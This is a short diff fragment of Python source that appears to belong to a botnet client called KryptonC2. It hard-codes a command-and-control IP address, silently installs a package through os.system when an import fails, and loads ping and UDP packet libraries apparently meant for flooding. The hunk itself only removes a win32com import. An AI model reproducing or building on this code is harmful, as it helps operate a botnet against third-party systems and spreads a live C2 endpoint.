@@ -37,7 +37,6 @@ except ImportError:
     os.system("pip install icmplib")
 from icmplib import ping as pig
 from scapy.layers.inet import UDP
-import win32com.client
     
 # IP AND PORT C2 ------------------->
 KRYPTONC2_ADDRESS  = "103.178.235.67"
